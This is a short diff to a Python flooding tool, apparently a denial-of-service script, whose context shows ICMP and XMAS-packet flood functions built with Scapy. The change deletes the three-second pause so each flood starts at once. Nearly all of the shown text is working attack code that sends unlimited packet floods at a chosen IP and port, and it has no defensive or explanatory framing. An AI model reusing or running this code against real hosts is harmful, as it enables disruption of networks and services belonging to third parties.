@@ -267,13 +267,13 @@ def synflood_attack(ip, port, num_requests):
         
 def icmpflood_attack(ip, num_requests):
     print("Starting ICMP Flood attack on", ip, "at Count", num_requests, "in 3 Second...")
-    time.sleep(3)
+    
     for x in range(0, int(num_requests)):
         send(IP(dst=ip)/ICMP())
 
 def xmasflood_attack(ip, port, num_requests):
     print("Starting XMAS Flood attack on", ip, "at Port", port, "at Count", num_requests, "in 3 Second...")
-    time.sleep(3)
+    
     for x in range(0, int(num_requests)):
         send(IP(dst=ip)/TCP(dport=port,
                             flags="FSRPAUEC",
